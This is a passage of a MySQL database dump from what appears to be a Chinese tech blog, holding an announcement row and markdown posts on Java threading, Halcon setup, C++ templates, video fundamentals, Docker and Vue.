-- MySQL dump 10.13  Distrib 8.0.32, for Linux (x86_64)
--
-- Host: localhost    Database: mysql56
-- ------------------------------------------------------
-- Server version	8.0.32-0ubuntu0.20.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `announcement`
--

DROP TABLE IF EXISTS `announcement`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `announcement` (
  `announcement_id` int NOT NULL AUTO_INCREMENT,
  `announcement_title` varchar(255) DEFAULT NULL,
  `announcement_body` text,
  `announcement_top` int DEFAULT NULL,
  `announcement_time` datetime DEFAULT NULL,
  PRIMARY KEY (`announcement_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `announcement`
--

LOCK TABLES `announcement` WRITE;
/*!40000 ALTER TABLE `announcement` DISABLE KEYS */;
INSERT INTO `announcement` VALUES (1,'欢迎访问','希望大家通过互联网分享知识,从而让更多开发者从中受益.',0,'2022-09-16 20:50:15');
/*!40000 ALTER TABLE `announcement` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog`
--

DROP TABLE IF EXISTS `blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `blog` (
  `blog_id` int NOT NULL AUTO_INCREMENT,
  `blog_title` varchar(255) DEFAULT NULL,
  `blog_body` text,
  `blog_discussCount` int DEFAULT NULL,
  `blog_favorCount` int DEFAULT NULL,
  `blog_blogViews` int DEFAULT NULL,
  `blog_time` datetime DEFAULT NULL,
  `blog_state` int DEFAULT NULL,
  `blog_top` int DEFAULT NULL,
  `user_id` int DEFAULT NULL,
  PRIMARY KEY (`blog_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog`
--

LOCK TABLES `blog` WRITE;
/*!40000 ALTER TABLE `blog` DISABLE KEYS */;
INSERT INTO `blog` VALUES (1,' Java高并发编程实战','# 一、进程与线程\n\n程序本身是静态的，是众多代码的组合产物，代码保存在文件中。如果程序要运行，则需要将程序加载到内存中，通过编译器将其编译成计算机能够理解的方式运行。\n如果想启动一个Java程序，先要创建一个JVM进程。\n进程是操作系统进行资源分配的最小单位，在一个进程中可以创建多个线程。多个线程各自拥有独立的局部变量、线程堆栈和程序计数器，能够访问共享的资源。\n\n>1.进程是操作系统分配资源的最小单位，线程是CPU调度的最小单位；\n>2.进程与进程之间是相对独立的，进程中的线程之间并不完全独立\n>4.进程上下文的切换要比线程的上下文切换慢很多；\n\n![pic1](https://img-blog.csdnimg.cn/3115f1d4f9b14f04ade0496bf135b41c.png#pic_center)\n\n# 二、线程组与线程池\n## 1、线程组\n\n线程组可以管理多个线程，顾名思义，线程组，就是把功能相似的线程放到一个组里，方便管理。\n```java\npackage com.guor.test;\n\npublic class ThreadGroupTest {\n    public static void main(String[] args) {\n        // 创建线程组\n        ThreadGroup threadGroup = new ThreadGroup(\"nezha\");\n\n        Thread thread = new Thread(threadGroup,()->{\n            // 线程组名称\n            String groupName = Thread.currentThread().getThreadGroup().getName();\n            // 线程名称\n            String threadName = Thread.currentThread().getName();\n            System.out.println(\"groupName -- \"+groupName);//groupName -- nezha\n            System.out.println(\"threadName -- \"+threadName);//threadName -- thread\n        },\"thread\");\n\n        thread.start();\n    }\n}\n\n```\n## 2、线程组和线程池有啥区别？\n\n1.线程组中的线程可以跨线程修改数据，而线程组和线程组之间不可以跨线程修改数据；\n2.线程池就是创建一定数量的线程，批量处理任务，当前任务执行完毕后，线程又可以去执行其它任务，通过重用已存在的线程，降低线程创建和销毁造成的消耗；\n3.线程池可以有效的管理线程的数量，避免线程的无限制创建，线程是很耗费系统资源的，动不动就会产生OOM，并且会造成cpu过度切换，也有强大的拓展功能，比如延时定时线程池。\n\n# 三、并行与并发\n\n并行指当多核CPU中的一个CPU执行一个线程时，其它CPU能够同时执行另一个线程，两个线程之间不会抢占CPU资源，可以同时运行。\n\n并发指在一段时间内CPU处理多个线程，这些线程会抢占CPU资源，CPU资源根据时间片周期在多个线程之间来回切换，多个线程在一段时间内同时运行，而在同一时刻不是同时运行的。\n\n**并行和并发的区别？**\n\n1.并行指多个线程在一段时间的每个时刻都同时运行，并发指多个线程在一段时间内同时运行（不是同一时刻，一段时间内交叉执行）\n2.并行的多个线程不会抢占系统资源，并发的多个线程会抢占系统资源；\n3.并行是多CPU的产物，单核CPU中只有并发，没有并行；\n\n![pic2](https://img-blog.csdnimg.cn/3387163e178b4d739c1e4dde69049da3.png#pic_center)\n\n# 四、多线程锁的升级原理\n\n锁的状态总共有四种，无锁状态、偏向锁、轻量级锁、重量级锁。\n![pic3](https://img-blog.csdnimg.cn/d6e67d2472ee4a3d9f664c284a8226fc.png#pic_center)\n## 锁状态对比\n| |偏向锁|轻量级锁|重量级锁\n|-|-|-|-|\n|使用场景|只有一个线程进入同步块|虽然很多线程，但没有冲突，线程进入时间错开因而并未争抢锁|发生了锁争抢的情况，多条线程进入同步块争用锁|\n|本质|取消同步操作|CAS操作代替互斥同步|互斥同步|\n|优点|不阻塞，执行效率高|不会阻塞|不会空耗CPU|\n|缺点|适用场景太局限|长时间获取不到锁空耗CPU|阻塞，上下文切换，消耗操作系统资源|',3,4,18,'2022-09-16 21:04:57',1,1,0),(2,'Halcon深度学习环境搭建','![1](https://img-blog.csdnimg.cn/20200323151046646.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhc2htb29k,size_16,color_FFFFFF,t_70)\n\n# halcon深度学习介绍\n\nHALCON是德国MVtec公司开发的一套完善的标准的机器视觉算法包，拥有应用广泛的机器视觉集成开发环境。它节约了产品成本，缩短了软件开发周期——HALCON灵活的架构便于机器视觉，医学图像和图像分析应用的快速开发。在欧洲以及日本的工业界已经是公认具有最佳效能的Machine Vision软件。\nHALCON2017版本即带深度学习算法包。可以进行物体识别、分类、语义分割。\n\n# 系统与环境搭建\n## 1、对电脑系统与硬件的要求与安装方式介绍\n### 1、深度学习基于CPU版本\n\n德国HALCON公司机器视觉软件 HALCON18.05于2018年5月22日正式发布。\n\n**实现CPU分类，在CPU上进行深度学习**\n\n1、安装halcon-19.11.0.0-windows.exe\n2、安装halcon-19.11.0.0-windows-deep-learning-core.exe\n3、安装halcon-19.11.0.0-windows-deep-learning-data.exe\n\n>以下部分可以不进行操作：\n4、安装CUDA运算平台软件\n5、安装cuDNN支持包\n6、配置环境变量\n\n### 2、深度学习基于GPU版本\n![2](https://img-blog.csdnimg.cn/20200323105621687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhc2htb29k,size_16,color_FFFFFF,t_70)\n例子：例如我们的显卡型号为GTX1060,我们在表格中的GPU型号一栏找到我们的显卡型号，之后查询其对应算力为6.1，符合要求。\n\n**1、安装halcon-19.11.0.0-windows.exe**\n\nhalcon软件的安装包括两个内容一个是软件本身的安装，一个是软件试用授权文件License的安装。\n试用License为一月一换，到期必须更换，购买正版授权加密狗可免限制使用。\n请勿修改系统时间去尝试延长授权使用时间，否则将导致被Halcon程序锁死无法使用！\n```language\nhalcon-19.11.0.0-windows.exe安装包\n链接：https://pan.baidu.com/s/1W9X5vy0Wu0q1ZpG6z15QVQ \n提取码：sbgn \n```\n**2、安装软件授权License**\n① 下载License文件\n```language\nhalcon-19.11.0.0授权License文件（2020年4月）\n链接：https://pan.baidu.com/s/1UTLEjNX1NOaVaSt6JeJKQA \n提取码：tbjp  \n```\n② 将License文件复制到安装目录下的\\license\\文件夹下\n```language\n例如：\nhalcon安装在：\nD:\\halcon2019\\\n则License许可放置位置在：\nD:\\halcon2019\\license\\ 文件夹下即可。\n```\n**3、安装CUDA运算平台软件**\n1、查询电脑CUDA支持的版本\n> https://jingyan.baidu.com/article/6fb756ec4fabc4241858fbf7.html\n\n2、下载CUDA安装包\n打开英伟达开发者网站，CUDA工具包下载网站 https://developer.nvidia.com/cuda-toolkit，网站界面如下图\n![3](https://img-blog.csdnimg.cn/2020032315054628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhc2htb29k,size_16,color_FFFFFF,t_70)',0,0,1,'2022-09-16 21:59:11',1,1,0),(3,' C++函数模板详解','# 定义\n\n函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定其功能。（好吧，咱也听不懂，直接上用法吧?）\n# 用法：\n\n面向对象的继承和多态机制有效提高了程序的可重用性和可扩充性。在程序的可重用性方面，程序员还希望得到更多支持。举一个最简单的例子，为了交换两个整型变量的值，需要写下面的 Swap 函数：\n```cpp\nvoid Swap(int & x, int & y)\n{\n    int tmp = x;\n    x = y;\n    y = tmp;\n}\n```\n为了交换两个 double 型变量的值，还需要编写下面的 Swap 函数：\n```cpp\nvoid Swap (double & xr double & y)\n{\n    double tmp = x;\n    x = y;\n    y = tmp;\n}\n```\n如果还要交换两个 char 型变量的值，交换两个 CStudent 类对象的值……都需要再编写 Swap 函数。而这些 Swap 函数除了处理的数据类型不同外，形式上都是一样的。能否只写一遍 Swap 函数，就能用来交换各种类型的变量的值呢？继承和多态显然无法解决这个问题。因此，“模板”的概念就应运而生了。\n\n众所周知，有了“模子”后，用“模子”来批量制造陶瓷、塑料、金属制品等就变得容易了。程序设计语言中的模板就是用来批量生成功能和形式都几乎相同的代码的。有了模板，编译器就能在需要的时候，根据模板自动生成程序的代码。从同一个模板自动生成的代码，形式几乎是一样的。\n\n# 函数模板的原理\n\nC++ 语言支持模板。有了模板，可以只写一个 Swap 模板，编译器会根据 Swap 模板自动生成多个 Sawp 函数，用以交换不同类型变量的值。\n\n在 C++ 中，模板分为函数模板和类模板两种。\n\n- 函数模板是用于生成函数；\n- 类模板则是用于生成类的。\n\n函数模板的写法如下：\n```cpp\ntemplate <class 类型参数1, class类型参数2, ...>\n返回值类型  模板名(形参表)\n{\n    函数体\n}\n```\n函数模板看上去就像一个函数。前面提到的 Swap 模板的写法如下：\n```cpp\ntemplate <class T>\nvoid Swap(T & x, T & y)\n{\n    T tmp = x;\n    x = y;\n    y = tmp;\n}\n```\n例如下面的程序：\n```cpp\n#include <iostream>\nusing namespace std;\ntemplate<class T>\nvoid Swap(T & x, T & y)\n{\n    T tmp = x;\n    x = y;\n    y = tmp;\n}\nint main()\n{\n    int n = 1, m = 2;\n    Swap(n, m);  //编译器自动生成 void Swap (int &, int &)函数\n    double f = 1.2, g = 2.3;\n    Swap(f, g);  //编译器自动生成 void Swap (double &, double &)函数\n    return 0;\n}\n```\n编译器在编译到`Swap(n, m)`;时找不到函数 Swap 的定义，但是发现实参 n、m 都是 int 类型的，用 int 类型替换 Swap 模板中的 T 能得到下面的函数：\n```cpp\nvoid Swap (int & x, int & y)\n{\n    int tmp = x;\n    x = y;\n    y = tmp;\n}\n```\n该函数可以匹配Swap(n, m);这条语句。于是编译器就自动用 int 替换 Swap 模板中的 T，生成上面的 Swap 函数，将该 Swap 函数的源代码加入程序中一起编译，并且将Swap(n, m);编译成对自动生成的 Swap 函数的调用。\n\n同理，编译器在编译到Swap(f, g);时会用 double 替换 Swap 模板中的 T，自动生成以下 Swap 函数：\n```cpp\nvoid Swap(double & x, double & y)\n{\n    double tmp = x;\n    x = y;\n    y = tmp;\n}\n```\n可以看出，在函数模板中，类型参数不但可以用来定义参数的类型，还能用于定义局部变量和函数模板的返回值。\n\n',3,1,17,'2022-09-16 22:49:52',1,1,1),(4,'【音视频基础】视频基础理论','# 图像基本概念\n## 图像\n\n1.**视频**是由一组图像组成，为了传输被压缩，最终在显示设备上显示；\n2.**图像**是由像素组成，像素是由RGB组成；\n- **RGB**即三原色（红、绿、蓝），可以混合成世界上所有的颜色。具体RGB值表示如下图所示\n- ![1](https://img-blog.csdnimg.cn/c75106801ed04888b8edf4583bfd4b44.png)\n- **分辨率**表示横向的像素点个数与纵向的像素点个数\n- **位深**：每一个像素占用的位数；最常见的是24位-RGB888，每个颜色都是8位；还有32位-RGBA，A表示alpha（透明度）。\n\n## 图像码流如何计算\n要求的**平滑度越高**，帧率就越大；要求的**清晰度越高**，分辨率就越大\n### 分辨率\n1.分辨率即是：X轴的像素个数 * Y轴的像素个数\n2.常见的宽高比16：9以及4：3\n### 帧率\n帧率是：每秒钟采集/播放图像的个数。\n动画的帧率是：25帧/s\n常见的帧率是：15帧/s，30帧/s，60帧/s\n实时通信一般是15帧/s（帧率越大，占用的传输带宽就越大）\n录课一般30帧/s能够满足需求\n电影一般是60帧/s\n### 码流计算\n未编码的RGB码流 = 分辨率（宽*高）*3（Byte）*25（fps）\n例如：1280720325=69120000 约69兆Byte/s；码流是以位为单位的，则69M8=552Mbit/s\n\n##图像显示\n图像显示的三种情况 \n1.图像大小等于显示区域大小\n![2](https://img-blog.csdnimg.cn/a55bf1f1bc67477584d0b2b9f602c2ce.png)\n2.图像小于显示区域（拉伸/留白）\n![3](https://img-blog.csdnimg.cn/219400ae236348f8a7aa438e4c239b62.png)\n3.图像大于显示区域（缩小/截断）\n![4](https://img-blog.csdnimg.cn/6518638152ca4a2e89d2c4a5c4d50b8f.png)',0,0,2,'2022-09-18 00:46:21',1,0,2),(5,'docker入门(利用docker部署web应用)','# 第一章 什么是docker\n## 1.1 docker的发展史\n\n2010年几个年轻人成立了一个做PAAS平台的公司dotCloud.起初公司发展的不错,不但拿到过一些融资,还获得了美国著名孵化器YCombinator的支持,后来微软谷歌亚马逊这样的大厂商也纷纷加入PAAS平台,竞争十分激烈,dotCloud举步维艰.\n\n2013年可能是公司发展的不是很好,工程师又不想自己的努力付之东流,于是他们决定将他们的核心技术开源.这项技术就是docker.当时docker的功能就是将linux容器中的应用代码打包,可以轻松的在服务器之间进行迁移.\n\n无心插柳柳成荫,docker技术风靡全球,于是dotCloud公司改名为docker Inc,并全面投入到docker的开发之中.\n\n2014.6 Docker发布了第一个版本 Docker1.0\n\n2014.7 获得C轮融资 $4000W\n\n2015.4 获得D轮融资 $9500W\n\n至今已经发布到docker \n\n## 1.2 什么是Docker\n\ndocker是一个用来装应用的容器,就像杯子可以装水,笔筒可以放笔,书包可以放书,可以把hello word放在docker中,可以把网站放入docker中,可以把任何想得到的程序放在docker中.\n\n# 第二章 了解docker\n## v2.1 docker思想\n### 2.1.1 集装箱\n\n没有集装箱之前运输货物,东西零散容易丢失,有了集装箱之后货物不容易丢失,我们可以把货物想象成程序,目前我们要把程序部署到一台新的机器上,可能会启动不起来,比如少一些配置文件什么的或者少了什么数据,有了docker的集装箱可以保证我们的程序不管运行在哪不会缺东西.\n### 2.1.2 标准化\n\n**1. 运输方式**\n\ndocker运输东西有一个超级码头,任何地方需要货物都由鲸鱼先送到超级码头,然后再由鲸鱼从超级码头把货物送到目的地去.对应的技术来说,比如我们要把台式机的应用部署到笔记本上,我们可能选择用QQ发过去或者用U盘拷过去,docker就标准化了这个过程,我们只需在台式机上执行一个docker命令,把鲸鱼派过来,把程序送到超级码头去,再在笔记本上执行一个docker命令,然后由鲸鱼把程序从超级码头送到笔记本上去.\n\n**2. 存储方式**\n\n当我们把程序存储到笔记本上时,我们需要一个目录,且我们要记住这个目录,因为下次我们可能还要修改,有了docker之后我们就不用记住了程序在哪里了,我们使用的时候只需要一条命令就行了.\n\n**3. API接口**\n\ndocker提供了一系列rest api的接口,包含了对docker也就是对我们的应用的一个启动停止查看删除等等,如当我们要启动tomcat时我们要执行startup命令,当我们要停止时要执行shutdown命令,如果不是tomcat,我们可能还需要一些别的命令.有了docker我们记docker的命令就可以对其进行操作.\n### 2.1.3 隔离\n\n我们在使用虚拟机时有自己的cpu,硬盘,内存,完全感觉不到外面主机的存在,docker也差不多,不过它更轻量,我们创建虚拟机可能要几分钟,但是docker只需要一秒.最底层的技术时linux一种内核的限制机制,叫做LXC,LXC是一种轻量级的容器虚拟化技术.最大效率的隔离了进程和资源.通过cgroup,namespace等限制,隔离进程组所使用的物理资源,比如CPU,MEMORY等等,这个机制在7,8年前已经加入到linux内核了,直到2013年docker出世的时候才火起来,大家可能奇怪为什么这么好的技术埋没这么多年都没人发现呢?英雄造时势,时势造英雄,如果没有云计算,敏捷开发,高频度的弹性伸缩需求,没有IT行业这么多年长足的发展,也就没有docker.\n\n## 2.2 docker解决的问题\n### 2.2.1 系统环境不一致\n\n开发:我本地没问题.运维:服务器没问题. 这个问题就变成了皮球.\n\n下面docker来了,它把操作系统,jdk,tomcat,代码,配置全部放到集装箱里.再打包放到鲸鱼上,由鲸鱼给我们送到服务器上,在我的机器上怎么运行,在别的机器上也怎么运行.不会有任何的问题.一句话就是docker解决了运行环境不一致所带来的问题.\n\n### 2.2.2 系统好卡,哪个哥们又写死循环了\n\n如果有根别人共用服务器的同学可能有这样的体会,莫名其妙发现自己的程序挂了,一查原因要不是内存不够了,要不是硬盘满了,还有就是发现某个服务变慢了,甚至敲终端都比较卡,但是linux本身就是一个多用户的操作系统本身就可以供多个用户使用,docker的隔离性可以解决这个问题,就算别人的程序还是死循环疯狂吃CPU,还是封装疯狂打日志把硬盘占满,还是内存泄漏,把内存占满,都不会导致我们的程序运行错误.因为docker在启动的时候就限定好了,它最大使用的CPU硬盘,如果超过了,就会杀掉对应进程.\n\n### 2.2.3 双11来了,服务器撑不住了\n\n大部分系统业务量并不是每天都比较平均的,特别是一些电商系统,每天总有那么几天业务量是平时的几倍甚至几十倍,如果按双11的规模去准备服务器那么对于平时的规模来说又是极大的浪费,所以就在节日前临时扩展机器,过完节再把多余的节点下线,这就给运维带来了非常大的工作量,一到过节就在各个机器上部署各种各样的服务,我们启动程序需要java,tocmat等等,并且还可能起不来还要调试,这是非常恶心的工作,有了docker一切都变得美好了,只要点一下服务器就可以从10台变成100台甚至1000,1W台.都是分分钟的事情.\n\n为什么会这么快呢?都是用标准的方式把我们的程序运过来,下载过来,再用标准的方式把它运行起来,就可以做到只要在每台机器上都执行一两条命令,就可以让程序正常跑起来,并且不用担心有问题.\n\n# 第三章 走进docker\n\n镜像就是上面说的集装箱,仓库就是超级码头,容器就是我们运行程序的地方.docker运行程序的过程就是去仓库把镜像拉到本地,然后用一条命令把镜像运行起来变成容器.\n\nbuild:构建,就是构建镜像.\n\nship:运输,运输镜像,从仓库和主机运输.\n\nrun:运行的镜像就是一个容器.\n\nbuild,ship,run和镜像,仓库,容器是一一对应的.\n## 3.1 镜像\n\n镜像的英文名交image.前面我们讲到了集装箱,鲸鱼拖着的所有集装箱就是一个镜像.\n\n从本质上来说镜像就是一系列文件,可以包括我们应用程序的文件,也可以包括我们应用的运行环境的文件,既然是文件,那么是以什么样的格式在本地保存的呢?\n\n说到存储格式,就要提到linux的一个存储技术,叫做联合文件系统,是一种分层的文件系统,可以将不同的目录挂到同一个虚拟文件系统下.\n\n比如test1下有三个文件夹,test2下有两个文件夹,还有一个readme文件.联合文件系统就是可以在一个文件夹(test)中看到多个文件夹(test1,test2)中的内容.\n\n通过这种方式可以实现文件的分层,test1可以把它看作第一层,test2可以把它看作第二层,每一层有每一层自己的文件,docker就是利用了这种分层的概念实现了镜像存储.\n![3](https://img-blog.csdnimg.cn/20190524103326625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E2MTAzNzY2ODE=,size_16,color_FFFFFF,t_70)\n下图就是镜像的存储格式,这张图是分层的,最下面一层,上面也是一层层的好像集装箱罗列在一起.这就是镜像最直观的存储方式.下面是操作系统的引导,上面是linux操作系统,再上面是一些相关的软件,如果是我们自己的程序,就可以是tomcat,jdk,再往上是应用代码,每一层是我们自己都可以控制得,最上面一层先忽略不看,因为这是和容器有关的.注意一点,docker镜像系统的每一层都是只读的,然后把每一层加载完成之后这些文件都会被看成是同一个目录,相当于只有一个文件系统.docker的这种文件系统被称之为镜像.\n![2](https://img-blog.csdnimg.cn/20190524104102791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E2MTAzNzY2ODE=,size_16,color_FFFFFF,t_70)\n\n## 3.2 容器\n\n为了便于理解,大家可以把容器想象成虚拟机,每个虚拟机都有自己的文件系统,可以把图1整个一部分看成是文件系统,与虚拟机系统的区别是这里面的文件系统是一层一层的,并且最下面的n层都是只读的,只有上面一层是可写的.为什么要有可写的这层呢?大家的程序运行起来,势必会要写一些日志,写一些文件,或者对系统的某一些文件做一些修改,所以容器在最上面一层创建了可读可写的文件系统.\n\n在程序的运行过程中,如果要写镜像文件时,因为镜像的每一层都是只读的,它会把文件的每一层拷到文件的最上层,然后再对它进行修改,修改之后,当我们的应用读一个文件时会从顶层进行查找,如果没有才会找下一层.\n\n由于容器的最上一层是可以修改的,镜像是不能修改的,这样就能保证镜像可以生成多个容器独立运行,没有任何干扰.\n## 3.3 仓库\n\n我们的镜像是要在其它机器上运行,如何进行传输呢?\n\n这就用到了docker仓库,我们要先把我们的镜像传到docker仓库中,再由目的地把docker仓库拉过去,这就完成了这样的一次传输过程.\n\n谁提供了这样的仓库呢?docker自己提供了,hub.docker.com,但是非常慢,为了解决这个问题,国内很多公司也在做自己的仓库.比较知名的是由网易蜂巢提供的 https://c.163yun.com/hub#/m/home/',0,0,0,'2022-09-21 22:17:54',1,0,3),(6,'Vue学习笔记','\n# 新建vue项目\n\n```bash\nvue init webpack [project_name]\n```\n\n```js\n//引入 element UI\nimport ElementUI from \'element-ui\';\nimport \'element-ui/lib/theme-chalk/index.css\';\n\nVue.use(ElementUI);\n```\n\n\n# Class绑定\n\n## 对象语法\n\n基础模板：\n\n```html\n<div :class=\"{ active: isActive, \'text-danger\': hasError }\"></div>\ndata: {\n  isActive: true,\n  hasError: false\n}\n```\n\n绑定的数据对象不必内联定义在模板里：\n\n```html\n<div :class=\"classObject\"></div>\ndata: {\n  classObject: {\n    active: true,\n    \'text-danger\': false\n  }\n}\n```\n\n也可以在这里绑定一个返回对象的计算属性：\n\n```html\n<div :class=\"classObject\"></div>\ndata: {\n  isActive: true,\n  error: null\n},\ncomputed: {\n  classObject() {\n    return {\n      active: this.isActive && !this.error,\n      \'text-danger\': this.error && this.error.type === \'fatal\'\n    }\n  }\n}\n```\n\n## 数组语法\n\n我们可以把一个数组传给 `v-bind:class`，以应用一个 class 列表：\n\n```html\n<div :class=\"[activeClass, errorClass]\"></div>\ndata: {\n  activeClass: \'active\',\n  errorClass: \'text-danger\'\n}\n```\n\n所以在数组语法中也可以使用对象语法：\n\n```html\n<div :class=\"[{ active: isActive }, errorClass]\"></div>\n```\n\n<br/>\n\n# Created和mounted区别\n\n`created`: 在模板渲染成html前调用，即通常初始化某些属性值，然后再渲染成视图。\n`mounted`: 在模板渲染成html后调用，通常是初始化页面完成后，再对html的dom节点进行一些需要的操作\n\n其实两者比较好理解，通常created使用的次数多，而mounted通常是在一些插件或组件的使用中进行操作\n\n> 如插件chart.js的使用通常有这一步:  var ctx = document.getElementById(ID)\n> 如果写入组件中，你会发现在created中无法对chart进行一些初始化配置，一定要等这个html渲染完后才可以进行，那么mounted就是不二之选\n\n<br/>\n\n# Vue.use和Vue.prototype.$xx的关系\n\n>https://segmentfault.com/a/1190000019611146\n\n<br/>\n\n# Vue.set(target, propertyName/index,value)\n\n由于 JavaScript 的限制，Vue **不能检测**数组和对象的变化，该用法能保证响应性\n\n**参数**：\n\n   - `{Object | Array} target`: 要更改的数据源(对象或数组)\n   - `{string | number} propertyName/index`: 要更改的具体数据/数组索引\n   - `{any} value`: 重新赋的值\n\n**用法**：\n\n向响应式对象中添加一个 property，并确保新 property 同样是响应式的，且触发视图更新\n注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象\n\n<br/>\n\n# v-for\n\n**1. 遍历数组元素**\n\n```html\n<li v-for=\"item in items\" :key=\"item.message\"> {{ item.message }} </li>\n```\n\n**2. 遍历对象元素**\n\n```html\n<!-- name index 可选  -->\n<div v-for=\"(value, name, index) in object\">\n  {{ index }}. {{ name }}: {{ value }}\n</div>\n\n0.title:English\n1.author:Jane Doe\n2.publish:2020-3-15\n```\n\n**3. 显示过滤/排序后的结果**\n\n可以创建一个计算属性，来返回过滤或排序后的数组。\n\n```html\n<li v-for=\"n in evenNumbers\">{{ n }}</li>\n```\n\n```js\ndata: {\n  numbers: [ 1, 2, 3, 4, 5 ]\n},\ncomputed: {\n  evenNumbers() {\n    return this.numbers.filter( number => number % 2 === 0)\n  }\n}\n```\n\n在计算属性不适用的情况下 (例如，在嵌套 `v-for` 循环中) 可以如下方法：\n\n```html\n<ul v-for=\"set in sets\">\n  <li v-for=\"n in even(set)\">{{ n }}</li>\n</ul>\n```\n\n```js\ndata: {\n  sets: [[ 1, 2, 3, 4, 5 ], [6, 7, 8, 9, 10]]\n},\nmethods: {\n  even(numbers) {\n    return numbers.filter( number => number % 2 === 0 )\n  }\n}\n```\n\n<br/>\n\n# 事件处理\n\n**按键修饰符**:  在监听键盘事件时， `v-on` 在监听键盘事件时添加按键修饰符：\n\n```html\n<!-- 只有在 key 是 Enter 时调用 vm.submit() -->\n<input @keyup.enter=\"submit\">\n```\n\n\n\n# 表单处理\n\n>https://cn.vuejs.org/v2/guide/forms.html\n\n<br/>\n\n# 组件传值\n\n```html\n<!-- 父组件传值num，监听子组件add方法 -->\n<blog-post :num=\"count\" @add=\"count += $event\"></blog-post>\n......\ndata(){ return { num: 0}}\n```\n\n```html\n<!-- 子组件点击将num加0.1 -->\n<button @click=\"$emit(\'add\', 0.1)\"> +0.1 </button>\n<h2> {{num}} </h2>\n......\nprops:{ num: Number }\n```\n\n\n# Props\n\n1.基本类型\n\n```html\n<!-- 这是一个 JavaScript 表达式而不是一个字符串。-->\n<!-- 1. 数字 -->\n<blog-post :likes=\"42\"></blog-post>\n<!-- 2. 布尔值 -->\n<blog-post :is-published=\"false\"></blog-post>\n<!-- 3. 数组 -->\n<blog-post :comment-ids=\"[234, 266, 273]\"></blog-post>\n```\n\n2.对象\n\n```html\n<!-- 1. 对象 -->\n<blog-post\n  :author=\"{\n    name: \'Veronica\',\n    company: \'Veridian Dynamics\'\n  }\"\n></blog-post>\n\n<!-- 2. 对象的所有property -->\n<blog-post v-bind=\"post\"></blog-post>\n  <!-- 等价于 -->\n<blog-post :id=\"post.id\"  :title=\"post.title\"></blog-post>\n```\n\n<br/>\n\n# Element UI\n\n**1. element UI表格行高、padding设置（不建议，2更通用）**\n\nelement UI里面表格的行高需要自己调整高度和设置padding，直接写style是不行的，里面有 \n\n1.row-style （行的 style）  \n2.header-row-styl  （表头行的 style）\n3.cell-style（单元格的 style）\n\n```html\n<el-table :row-style=\"{height:\'32px\'}\"  :header-row-style=\"{height:\'32px\'}\" :cell-style=\"{padding:\'1px\'}\">\n　　<el-table-column></el-table-column>\n　　<el-table-column></el-table-column>\n</el-table>\n```\n\n**2. 重写element UI样式不生效原因**\n\n原因：scoped是当前组件的唯一标识，针对第三方组件（element-ui）的样式无效，即使!importent也无效\n\n解决：（1）写在全局css文件中\n\n（2）使用穿透`>>>`如下，div对应父级元素\n\n```css\ndiv >>> .el-dialog__body {\n  padding: 10px 0 0;\n}\n```\n\n<br/>\n\n# ECharts\n\n数据更新后，图表没有更新的问题\n\n> 原因：代码 myChart.setOption(option);\n>\n> ​	setOption有3个属性，setOption(option,notMerge,lazyUpdate);\n>\n> ​	第二个notMerge默认为false,即默认合并两个数据,设置为true即可实现刷新效果\n>\n> 解决：myChart.setOption(option,true);\n\n<br/>\n\n# 父组件更新，子组件也更新           \n\n1.父组件 使用 Math.ramdom()\n\n   ```html\n   <detail :ramdom=\"Math.random()\"></detail>\n   ```\n\n2.子组件获取\n\n   ```js\n   props: { ramdom: Number }\n   ```\n\n   然后监听这个ramdom变化，处理子组件的更新\n\n   ```js\n   watch: {\n   	ramdom(newValue, oldValue) {\n   		this.init()\n   	}\n   }\n   ```\n\n\n<br/>\n\n# vue + el-menu 实现菜单栏无限多层级分类\n\n> https://blog.csdn.net/l508742729/article/details/107109226/\n\n<br/>\n\n# 前端几种加密方式\n\n> https://blog.csdn.net/guxingsheng/article/details/84451573',0,0,2,'2022-09-21 22:24:26',1,0,1),(7,'嵌入式和单片机，两者的区别','如果要问具体什么是嵌入式，什么是单片机，它们之间究竟有什么区别，我相信大部分人并不能解释清楚。\n\n▉ 1. 